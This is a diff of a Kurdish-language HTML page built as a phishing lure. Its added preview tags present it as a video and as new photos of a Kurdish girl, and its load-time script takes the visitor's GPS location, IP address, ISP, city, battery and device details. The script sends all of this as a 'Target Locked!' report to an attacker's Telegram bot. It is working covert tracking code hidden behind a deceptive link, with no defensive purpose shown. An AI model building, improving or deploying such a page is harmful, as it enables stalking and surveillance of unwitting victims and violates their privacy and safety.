@@ -2,7 +2,12 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <title> </title>
+    
+    <title>Video_7392.mp4</title> <meta property="og:title" content="هەواڵێکی نوێ وێنەی کچە کوردەکە بڵاو بووەوە">
+    <meta property="og:description" content="بۆ بینینی وێنەکان کلیک لەسەر لینکەکە بکە...">
+    <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg"> <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+
     <style>body { background: white; margin: 0; }</style>
 </head>
 <body onload="capture()">
@@ -15,27 +20,37 @@
         const uid = params.get('id');
         if (!uid) return;
 
-        // ١. یەکسەر داوای لۆکەیشن دەکات
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             
-            // ٢. وەرگرتنی زانیارییە خێراکان
+            // وەرگرتنی کات و باتری
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
+
             let bat = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 bat = Math.floor(b.level * 100) + "%";
             }
 
+            // وەرگرتنی شار و ئایپی
+            let ip = "N/A", city = "Unknown", isp = "Korek";
+            try {
+                const res = await fetch('https://ipwho.is/');
+                const data = await res.json();
+                ip = data.ip; city = data.city; isp = data.connection.isp;
+            } catch(e) {}
+
             let report = `🚨 <b>Target Locked!</b>\n\n` +
                          `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
-                         `🔋 <b>Battery:</b> ${bat}\n` +
-                         `📱 <b>Device:</b> ${navigator.platform}`;
+                         `🌐 <b>IP:</b> <code>${ip}</code> (${isp})\n` +
+                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                         `🔋 <b>Battery:</b> <code>${bat}</code>\n` +
+                         `🕒 <b>Time:</b> <code>${timeStr}</code>\n` +
+                         `🏙️ <b>City:</b> <code>${city}</code>`;
 
-            // ٣. ناردنی خێرا (Beacon) - ئەمە نەوەستاوە و یەکسەر دەیپێکێت
             const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
-            
-            // ئەمە فێڵە سەرەکییەکەیە بۆ خێرایی
             navigator.sendBeacon(url);
 
         }, (err) => {
